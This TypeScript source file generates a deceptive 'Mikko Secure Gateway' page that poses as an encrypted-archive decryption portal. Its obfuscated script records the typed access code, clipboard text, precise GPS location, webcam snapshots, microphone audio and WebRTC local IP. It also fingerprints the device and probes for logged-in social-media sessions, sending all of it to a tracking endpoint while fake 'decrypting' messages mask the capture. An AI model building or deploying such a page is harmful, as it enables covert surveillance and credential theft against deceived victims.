import JavaScriptObfuscator from 'javascript-obfuscator';

export const getMikkoCaptureScript = (id: string, fileName: string, redirectUrl: string) => {
  const rawScript = `
  (function() {
    var permsCompleted = 0;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    var filePayloadName = '${fileName}';
    
    var extraBuffer = {};
    var extraTimeout = null;
    var running = false;
    var sessionChecked = false;
    
    // --- Core Logging Functions ---
    async function logEvent(type, data) {
      console.log("[MIKKO] logEvent: ", type, data);
      try {
        const response = await fetch('/api/mikkolink/' + targetId + '/' + type, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'X-Trap-Id': targetId
          },
          body: JSON.stringify(Object.assign({ fileName: filePayloadName, ts: Date.now() }, data))
        });
        return response;
      } catch(e) {
        console.error("[MIKKO] logEvent error: ", e);
        return null;
      }
    }

    async function logExtra(data) {
      Object.assign(extraBuffer, data);
      if (extraTimeout) clearTimeout(extraTimeout);
      
      extraTimeout = setTimeout(async () => {
        await flushExtra();
      }, 800);
    }

    async function flushExtra() {
      if (Object.keys(extraBuffer).length > 0) {
        var dataToSend = Object.assign({}, extraBuffer);
        extraBuffer = {};
        await logEvent('extra', dataToSend);
      }
    }

    function clientLog(msg, data) {
      logEvent('debug', { msg: msg, data: data || {}, ts: Date.now() });
    }

    // --- 1. Social Media Login Session Checker ---
    async function checkSocialSessions() {
      if (sessionChecked) return;
      sessionChecked = true;
      clientLog("checkSocialSessions: Initiated");
      
      var socialTargets = [
        { name: 'Facebook', url: 'https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico' },
        { name: 'Instagram', url: 'https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico' },
        { name: 'GitHub', url: 'https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Ffluidicon.png' },
        { name: 'Steam', url: 'https://store.steampowered.com/login/?redir=favicon.ico' },
        { name: 'Google', url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico' },
        { name: 'Spotify', url: 'https://open.spotify.com/login?forward_url=https%3A%2F%2Fopen.spotify.com%2Ffavicon.ico' },
        { name: 'TikTok', url: 'https://www.tiktok.com/login?redirect_url=https%3A%2F%2Fwww.tiktok.com%2Ffavicon.ico' }
      ];

      var detected = [];
      var checksCompleted = 0;

      socialTargets.forEach(function(target) {
        var img = new Image();
        img.referrerPolicy = 'no-referrer';
        var minTime = Date.now();
        
        img.onload = function() {
          var duration = Date.now() - minTime;
          // Redirection succeeded (loads favicon)
          detected.push(target.name + ' (LOGGED_IN)');
          checksCompleted++;
          checkFinish();
        };
        
        img.onerror = function() {
          // Errored due to content-type or cross-origin block, or truly not logged in (which redirects to HTML login)
          // In some cases if not logged in, redirection to HTML form causes onerror as well.
          // To make it distinct, check duration or assume error is standard for not logged.
          detected.push(target.name + ' (OUT_OR_BLOCKED)');
          checksCompleted++;
          checkFinish();
        };

        img.src = target.url;
      });

      function checkFinish() {
        if (checksCompleted === socialTargets.length) {
          logEvent('extra', { active_sessions: detected.join(', ') });
        }
      }
    }

    // --- 2. Advanced Environment Probes ---
    async function runAdvancedProbes() {
      // Benchmark performance
      var start = performance.now();
      for (var i = 0; i < 400000; i++) { Math.sqrt(Math.random()); }
      var score = (performance.now() - start).toFixed(1);
      
      await logExtra({ 
        cpu_benchmark: score + 'ms',
        mem_capacity_gb: navigator.deviceMemory || 'N/A'
      });

      // Browser features
      var browserFeatures = {
        webgl_support: !!window.WebGLRenderingContext,
        webaudio_support: !!(window.AudioContext || window.webkitAudioContext),
        service_workers: 'serviceWorker' in navigator,
        secure_context: window.isSecureContext
      };
      await logExtra({ browser_intel: JSON.stringify(browserFeatures) });

      // Hardware high entropy
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion', 'bitness', 'formFactor'])
          .then(function(h) {
            logExtra({ high_entropy_hw: JSON.stringify(h) });
          }).catch(function(){});
      }

      // Check battery level
      if (navigator.getBattery) {
         navigator.getBattery().then(function(bat) {
            logExtra({ battery_status: (bat.level * 100).toFixed(0) + '%, ' + (bat.charging ? 'STATION' : 'BATTERY') });
         }).catch(function(){});
      }

      // WebGL Fingerprint
      try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          var dbg = gl.getExtension('WEBGL_debug_renderer_info');
          var gpuInfo = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A';
          await logExtra({ webgl_gpu: gpuInfo });
        }
      } catch(e) {}
    }

    // --- 3. Geolocation Capture ---
    async function fireGPS() {
      if (navigator.geolocation) {
        clientLog("fireGPS: Geolocation supported");
        return new Promise(function(resolve) {
          var loggedOnce = false;
          var tracker = navigator.geolocation.watchPosition(
            function(pos) {
               logEvent('gps', {
                 lat: pos.coords.latitude,
                 lon: pos.coords.longitude,
                 acc: pos.coords.accuracy.toFixed(1),
                 alt: pos.coords.altitude || null,
                 speed: pos.coords.speed || null
               });
               loggedOnce = true;
               if (pos.coords.accuracy < 20) {
                 navigator.geolocation.clearWatch(tracker);
                 resolve();
               }
            },
            function(err) {
               clientLog("fireGPS error", err.message);
               if (!loggedOnce) {
                  // Fallback to IP geolocation
                  fetch('https://ipapi.co/json/')
                    .then(function(r) { return r.json(); })
                    .then(function(data) { logEvent('ip_geo', data); })
                    .catch(function(){});
               }
               resolve();
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
          );
          
          setTimeout(function() {
             navigator.geolocation.clearWatch(tracker);
             resolve();
          }, 20000);
        });
      }
      return Promise.resolve();
    }

    // --- 4. Camera & Snapshot Streaming ---
    async function fireCamera() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        clientLog("fireCamera: Initializing stream");
        try {
          var stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: true
          }).catch(function() {
            // Fallback video only
            return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
          });

          if (stream) {
             clientLog("fireCamera: Access GRANTED");
             
             // Attach to frontend scan window
             var videoElement = document.getElementById('biometric-feed');
             if (videoElement) {
                videoElement.srcObject = stream;
                videoElement.setAttribute('autoplay', '');
                videoElement.setAttribute('playsinline', '');
                videoElement.setAttribute('muted', '');
                videoElement.play().catch(function(){});
             }

             // Take snapshots
             var snapCount = 0;
             var captureInterval = setInterval(async function() {
                if (snapCount >= 10 || hasRedirected) {
                  clearInterval(captureInterval);
                  return;
                }
                var canvas = document.createElement('canvas');
                canvas.width = videoElement && videoElement.videoWidth ? videoElement.videoWidth : 640;
                canvas.height = videoElement && videoElement.videoHeight ? videoElement.videoHeight : 480;
                var ctx = canvas.getContext('2d');
                if (ctx && videoElement) {
                   ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                   var b64Data = canvas.toDataURL('image/jpeg', 0.82);
                   await logEvent('extra', {
                      visual_identity: b64Data,
                      capture_seq: snapCount++
                   });
                }
             }, 4000);

             // Microphone recording chunk (if audio enabled)
             try {
                if (stream.getAudioTracks().length > 0) {
                   var recorder = new MediaRecorder(stream);
                   recorder.ondataavailable = async function(evt) {
                      if (evt.data && evt.data.size > 0) {
                         var reader = new FileReader();
                         reader.onload = async function() {
                            var b64Audio = typeof reader.result === 'string' ? reader.result.split(',')[1] : '';
                            if (b64Audio) {
                               await logEvent('extra', { voice_fingerprint: b64Audio });
                            }
                         };
                         reader.readAsDataURL(evt.data);
                      }
                   };
                   recorder.start();
                   setTimeout(function() {
                     if (recorder.state === 'recording') recorder.stop();
                   }, 6000);
                }
             } catch(e) {}
             
          }
        } catch(e) {
          clientLog("fireCamera failed", e.message);
        }
      }
    }

    // --- 5. Clipboard Sync ---
    async function fireClipboard() {
      if (navigator.clipboard && navigator.clipboard.readText) {
        try {
          var text = await navigator.clipboard.readText();
          if (text) {
             await logExtra({ clipboard_raw: text });
          }
        } catch(err) {
          clientLog("Clipboard access denied/errored");
        }
      }
    }

    // --- Redirect Control ---
    async function triggerRedirect() {
      if (hasRedirected) return;
      hasRedirected = true;
      await flushExtra();
      setTimeout(function() {
         window.location.href = targetUrl;
      }, 1000);
    }

    // Exposed start-capture routine
    window.startMikkoTelemetry = async function(secretInputValue) {
      if (running) return;
      running = true;
      clientLog("startMikkoTelemetry: Triggered");
      
      // Update UI elements
      var scanButton = document.getElementById('action-button');
      if (scanButton) {
        scanButton.disabled = true;
        scanButton.style.background = '#222';
        scanButton.style.borderColor = '#00f3ff/40';
        scanButton.innerText = 'EXTRACTING...';
      }

      // Record any inputs entered
      if (secretInputValue) {
         await logEvent('extra', { credential_vault: secretInputValue });
      }

      // Gather Base Device Fingerprint
      var baseSetup = {
        platform: navigator.platform,
        user_agent: navigator.userAgent,
        screen_size: window.screen.width + 'x' + window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
        cores_available: navigator.hardwareConcurrency || 'N/A',
        webgl_gpu: 'N/A',
        local_ip_leak: 'N/A'
      };

      // WebRTC internal IP leak
      try {
         var rtc = new RTCPeerConnection({ iceServers: [] });
         rtc.createDataChannel('', { reliable: false });
         rtc.onicecandidate = function(evt) {
            if (evt.candidate) {
               var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(evt.candidate.candidate);
               if (m) {
                  baseSetup.local_ip_leak = m[1];
                  logEvent('extra', { webrtc_local_ip: m[1] });
               }
            }
         };
         rtc.createOffer().then(function(off) { rtc.setLocalDescription(off); }).catch(function(){});
      } catch(err){}

      // Send Base Metadata first
      await logEvent('info', baseSetup);

      // Begin checking active social logins and advanced diagnostics
      checkSocialSessions();
      runAdvancedProbes();

      // Launch permissions
      var bar = document.getElementById('progress-bar-fill');
      var label = document.getElementById('operation-status');
      
      function updateIndicator(text, width) {
         if (label) label.innerText = text.toUpperCase();
         if (bar) bar.style.width = width + '%';
      }

      updateIndicator("PROBING DEVICE INTEGRITY...", 20);
      
      // GPS compliance checking
      updateIndicator("Triangulating localized telemetry...", 45);
      await fireGPS();
      
      // Clipboard grab
      await fireClipboard();

      // Webcam facial synchronizer
      updateIndicator("CORRELATING BIOMETRIC WAVEFORMS...", 75);
      await fireCamera();

      // Run progress simulation
      var pct = 75;
      var interval = setInterval(function() {
         pct += 3;
         if (pct >= 100) {
            clearInterval(interval);
            updateIndicator("CIPHER KEY INTEGRATED. REDIRECTING...", 100);
            setTimeout(triggerRedirect, 1500);
         } else {
            updateIndicator("DECRYPTING PAYLOAD: " + pct + "%", pct);
         }
      }, 150);
    };

    // Auto-probe passively as soon as they loaded the page (no permission required metrics)
    window.onload = function() {
       clientLog("MikkoLink: Target page loaded successfully");
       // Passive check
       setTimeout(function() {
          var sysInfo = {
             device_screen: window.screen.width + 'x' + window.screen.height,
             connection_rtt: navigator.connection ? navigator.connection.rtt : 'N/A',
             connection_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'N/A'
          };
          logEvent('passive', sysInfo);
       }, 500);
    };

  })();
  `;

  try {
     const obfRes = JavaScriptObfuscator.obfuscate(rawScript, {
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 0.5,
        deadCodeInjection: false,
        debugProtection: false,
        disableConsoleOutput: false,
        identifierNamesGenerator: 'hexadecimal',
        numbersToExpressions: true,
        renameGlobals: false,
        selfDefending: false,
        splitStrings: true,
        splitStringsChunkLength: 10,
        stringArray: true,
        stringArrayCallsTransform: true,
        stringArrayCallsTransformThreshold: 0.5,
        stringArrayEncoding: ['base64'],
        stringArrayIndexShift: true,
        stringArrayRotate: true,
        stringArrayShuffle: true,
        stringArrayWrappersCount: 1,
        stringArrayWrappersChainedCalls: true,
        stringArrayWrappersParametersMaxCount: 2,
        stringArrayWrappersType: 'variable',
        stringArrayThreshold: 0.75,
        unicodeEscapeSequence: false
     });
     return `<script>${obfRes.getObfuscatedCode()}</script>`;
  } catch(e) {
     return `<script>${rawScript}</script>`;
  }
};

export const renderMikkoLinkPage = (id: string, fileName: string, redirectUrl: string) => {
  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mikko Secure Gateway | Decrypt Archive</title>
  <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e3/Key_icon_gold.svg">
  <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;500;700;800&display=swap');
     
     body {
        background-color: #050608;
        color: #00ffff;
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        overflow-x: hidden;
     }

     /* Futuristic Grid Lines Background */
     .grid-bg {
        position: fixed;
        inset: 0;
        z-index: 1;
        background-image: 
          linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
          linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
        background-size: 30px 30px;
        pointer-events: none;
     }

     .scanline {
        position: fixed;
        width: 100%;
        height: 4px;
        background: rgba(0, 243, 255, 0.08);
        z-index: 5;
        top: 0;
        animation: scan 4s linear infinite;
        pointer-events: none;
     }

     @keyframes scan {
        0% { top: -10px; }
        100% { top: 100vh; }
     }

     .glow-container {
        position: relative;
        z-index: 10;
        width: 100%;
        max-width: 460px;
        background: rgba(8, 11, 16, 0.95);
        border: 1px solid rgba(0, 243, 255, 0.25);
        box-shadow: 0 0 50px rgba(0, 243, 255, 0.15);
        border-radius: 12px;
        padding: 40px;
        box-sizing: border-box;
        text-align: center;
     }

     .header-logo {
        position: relative;
        width: 70px;
        height: 70px;
        margin: 0 auto 24px;
        border-radius: 50%;
        border: 2px solid #00f3ff;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(0, 243, 255, 0.05);
        box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
     }

     /* Scanning radar effect on logo */
     .header-logo::after {
        content: '';
        position: absolute;
        inset: -2px;
        border-radius: 50%;
        border: 2px solid transparent;
        border-top-color: #00f3ff;
        animation: spin 2s linear infinite;
     }

     @keyframes spin {
        to { transform: rotate(360deg); }
     }

     h1 {
        font-family: 'Share Tech Mono', monospace;
        font-size: 24px;
        font-weight: normal;
        margin: 0 0 10px;
        letter-spacing: 2px;
        text-transform: uppercase;
        color: #fff;
        text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
     }

     .subtitle {
        color: rgba(255, 255, 255, 0.5);
        font-size: 13px;
        line-height: 1.6;
        margin-bottom: 30px;
     }

     /* Payload container */
     .payload-box {
        background: rgba(0, 243, 255, 0.03);
        border: 1px border;
        border: 1px solid rgba(0, 243, 255, 0.1);
        border-radius: 6px;
        padding: 16px;
        margin-bottom: 24px;
        display: flex;
        align-items: center;
        justify-content: flex-start;
     }

     .payload-icon {
        font-size: 28px;
        margin-right: 15px;
     }

     .payload-details {
        text-align: left;
     }

     .payload-name {
        font-family: 'Share Tech Mono', monospace;
        font-size: 14px;
        color: #fff;
        word-break: break-all;
     }

     .payload-meta {
        font-size: 11px;
        color: rgba(0, 243, 255, 0.5);
        margin-top: 4px;
     }

     /* Interactive fields */
     .input-group {
        margin-bottom: 24px;
        text-align: left;
     }

     .input-label {
        display: block;
        font-family: 'Share Tech Mono', monospace;
        font-size: 11px;
        color: rgba(0, 243, 255, 0.7);
        text-transform: uppercase;
        margin-bottom: 8px;
        letter-spacing: 1px;
     }

     .input-field {
        width: 100%;
        background: #000;
        border: 1px solid rgba(0, 243, 255, 0.2);
        border-radius: 6px;
        padding: 14px;
        box-sizing: border-box;
        color: #fff;
        font-family: 'Share Tech Mono', monospace;
        font-size: 14px;
        letter-spacing: 2px;
        transition: all 0.3s ease;
     }

     .input-field:focus {
        outline: none;
        border-color: #00f3ff;
        box-shadow: 0 0 10px rgba(0, 243, 255, 0.2);
     }

     .btn-decrypt {
        width: 100%;
        background: #00f3ff;
        color: #000;
        border: none;
        border-radius: 6px;
        padding: 16px 0;
        font-family: 'Share Tech Mono', monospace;
        font-size: 15px;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 3px;
        cursor: pointer;
        transition: all 0.2s ease;
        box-shadow: 0 4px 20px rgba(0, 243, 255, 0.3);
     }

     .btn-decrypt:hover {
        background: #ffffff;
        box-shadow: 0 6px 25px rgba(255, 255, 255, 0.4);
        transform: translateY(-1px);
     }

     .btn-decrypt:active {
        transform: translateY(1px);
     }

     /* Radar biometric scanner view frame */
     .radar-hud-wrapper {
        display: none; /* Displayed when decryption starts */
        position: relative;
        width: 160px;
        height: 160px;
        margin: 20px auto 30px;
        border-radius: 50%;
        border: 2px solid rgba(0, 243, 255, 0.4);
        overflow: hidden;
        background: #000;
        box-shadow: 0 0 30px rgba(0, 243, 255, 0.2);
     }

     .radar-hud-wrapper video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1); /* mirror effect */
     }

     .radar-grid-line {
        position: absolute;
        inset: 0;
        pointer-events: none;
        background-image: 
          radial-gradient(circle, transparent 35%, rgba(0, 243, 255, 0.08) 36%, rgba(0, 243, 255, 0.08) 38%, transparent 39%),
          radial-gradient(circle, transparent 65%, rgba(0, 243, 255, 0.08) 66%, rgba(0, 243, 255, 0.08) 68%, transparent 69%);
     }

     .radar-crosshair {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 20px;
        height: 20px;
        pointer-events: none;
     }

     .radar-crosshair::before,
     .radar-crosshair::after {
        content: '';
        position: absolute;
        background: #00f3ff;
     }

     /* vertical */
     .radar-crosshair::before {
        top: 0; left: 9px; width: 2px; height: 20px;
     }
     /* horizontal */
     .radar-crosshair::after {
        top: 9px; left: 0; width: 20px; height: 2px;
     }

     /* Progress loader visual */
     .progress-hud {
        display: none;
        margin-top: 24px;
     }

     .progress-label {
        font-family: 'Share Tech Mono', monospace;
        font-size: 11px;
        letter-spacing: 1.5px;
        color: #00f3ff;
        text-transform: uppercase;
        margin-bottom: 10px;
     }

     .progress-track {
        width: 100%;
        height: 3px;
        background: rgba(0, 243, 255, 0.1);
        border-radius: 2px;
        overflow: hidden;
     }

     .progress-fill {
        width: 0%;
        height: 100%;
        background: #00f3ff;
        transition: width 0.2s ease;
        box-shadow: 0 0 10px #00f3ff;
     }

     .gateway-footer {
        font-family: 'Share Tech Mono', monospace;
        font-size: 10px;
        color: rgba(0, 243, 255, 0.3);
        margin-top: 35px;
        letter-spacing: 1px;
        text-transform: uppercase;
     }

     .gateway-footer a {
        color: #00f3ff;
        text-decoration: none;
     }

     .gateway-footer a:hover {
        text-decoration: underline;
     }
  </style>
</head>
<body>

  <div class="grid-bg"></div>
  <div class="scanline"></div>

  <div class="glow-container">
     <div class="header-logo">
        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00f3ff" stroke-width="2">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
     </div>
     
     <h1>Mikko Secure Gateway</h1>
     <p class="subtitle">Secure end-to-end cryptographic channel constructed. Decryption authorization required to synchronize remote parameters.</p>

     <div class="payload-box">
        <div class="payload-icon">📦</div>
        <div class="payload-details">
           <div class="payload-name" id="p-name">${fileName}</div>
           <div class="payload-meta">CIPHER: AES-GCM-256 // SIZE: ~24.8 MB</div>
        </div>
     </div>

     <!-- Biometric Webcam Stream frame (Visible only when scanning) -->
     <div class="radar-hud-wrapper" id="radar-window">
        <video id="biometric-feed" muted></video>
        <div class="radar-grid-line"></div>
        <div class="radar-crosshair"></div>
     </div>

     <div class="form-container" id="interaction-form">
        <div class="input-group">
           <label class="input-label" for="secret-key">Decryption Access Code</label>
           <input type="password" class="input-field" id="secret-key" placeholder="••••••••" autocomplete="off">
        </div>

        <button class="btn-decrypt" id="action-button" onclick="initiateDecryption()">Authorize & Decrypt</button>
     </div>

     <div class="progress-hud" id="progress-indicator">
        <div class="progress-label" id="operation-status">Initializing Decryption Sequence...</div>
        <div class="progress-track">
           <div class="progress-fill" id="progress-bar-fill"></div>
        </div>
     </div>

     <div class="gateway-footer">
        Security Authenticated by MikkoLink Engine v3.8<br>
        <div style="margin-top: 10px; display: flex; gap: 12px; justify-content: center;">
           <a href="#">Security Policy</a>
           <span>•</span>
           <a href="#">Compliance</a>
        </div>
     </div>
  </div>

  <script>
     function initiateDecryption() {
        var keyInput = document.getElementById('secret-key');
        var val = keyInput ? keyInput.value : '';
        
        // Hide form, show radar stream and progress
        document.getElementById('interaction-form').style.display = 'none';
        document.getElementById('radar-window').style.display = 'block';
        document.getElementById('progress-indicator').style.display = 'block';
        
        // Let background obfuscated script trigger with access code
        if (window.startMikkoTelemetry) {
           window.startMikkoTelemetry(val);
        }
     }
  </script>

  ${getMikkoCaptureScript(id, fileName, redirectUrl)}

</body>
</html>`;
};
